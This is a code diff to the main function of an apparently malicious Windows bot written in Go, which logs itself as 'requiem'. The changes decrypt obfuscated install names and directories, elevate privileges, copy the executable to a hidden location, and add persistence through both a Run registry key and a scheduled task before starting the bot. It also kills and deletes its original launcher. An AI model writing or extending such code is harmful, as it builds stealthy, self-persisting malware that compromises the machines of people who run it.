@@ -19,12 +19,15 @@ const DELETE_OLD_FILE_MAX_RETRIES int = 20
 
 func main() {
 	if !utils.CheckMutex() {
+		utils.DebugLog("requiem is already running")
 		return
 	}
 
 	defer utils.RemoveMutex()
 
 	store.InitState()
+	store.DecryptedPersistenceName = utils.Decrypt(store.PERSISTENCE_NAME)
+
 	utils.DebugLog("\n")
 
 	args := os.Args
@@ -53,7 +56,7 @@ func main() {
 
 				err = utils.RunCommand("taskkill", "/f", "/im", filepath.Base(path))
 				if err != nil {
-					utils.DebugLog(fmt.Sprintf("failed to kill launch exec - %s", err))
+					utils.DebugLog(fmt.Sprintf("failed to kill launch exec - %v", err))
 				}
 
 				for i := range DELETE_OLD_FILE_MAX_RETRIES {
@@ -62,19 +65,20 @@ func main() {
 						break
 					}
 
-					utils.DebugLog(fmt.Sprintf("failed to delete old file (%d/%d) - %s", i+1, DELETE_OLD_FILE_MAX_RETRIES, err))
+					utils.DebugLog(fmt.Sprintf("failed to delete old file (%d/%d) - %v", i+1, DELETE_OLD_FILE_MAX_RETRIES, err))
 					time.Sleep(500 * time.Millisecond)
 				}
 			}
 		}
 
-		utils.DebugLog("starting")
+		utils.DebugLog("starting...")
 
 		bot.Start()
 		return
 	}
 
 	if store.REQUIRE_ADMIN && !store.IsAdmin {
+		utils.RemoveMutex()
 		funcs.ElevateWithConfig()
 	}
 
@@ -82,15 +86,13 @@ func main() {
 	var newName string
 
 	if store.USE_CUSTOM_NAME {
-		newName = store.CUSTOM_NAME
+		newName = utils.Decrypt(store.CUSTOM_NAME)
 	} else {
 		newName = "_" + filepath.Base(store.ExecPath)
 	}
 
-	store.DecryptedPersistenceName = utils.Decrypt(store.PERSISTENCE_NAME)
-
 	if store.USE_CUSTOM_DIR {
-		newDir = store.CUSTOM_DIR
+		newDir = utils.Decrypt(store.CUSTOM_DIR)
 	} else {
 		if store.IsAdmin {
 			newDir = path.Join(
@@ -104,7 +106,7 @@ func main() {
 
 	err := os.MkdirAll(newDir, 0666)
 	if err != nil {
-		utils.DebugLog(fmt.Sprintf("failed to create dir - %s", err))
+		utils.DebugLog(fmt.Sprintf("failed to create dir - %v", err))
 		return
 	}
 
@@ -113,11 +115,20 @@ func main() {
 
 	err = utils.CopyFile(store.ExecPath, newExecPath)
 	if err != nil {
-		utils.DebugLog(fmt.Sprintf("failed to copy file - %s", err))
+		utils.DebugLog(fmt.Sprintf("failed to copy file - %v", err))
 		return
 	}
 
-	persistence.Persist(newExecPath)
+	err = persistence.RunRegistryPersist(newExecPath, false)
+	if err != nil {
+		utils.DebugLog(fmt.Sprintf("failed to persist (run registry) - %v", err))
+	}
+
+	err = persistence.SchedularPersist(newExecPath, false)
+	if err != nil {
+		utils.DebugLog(fmt.Sprintf("failed to persist (schedular) - %v", err))
+	}
+
 	utils.HideFile(newExecPath)
 
 	utils.RemoveMutex()
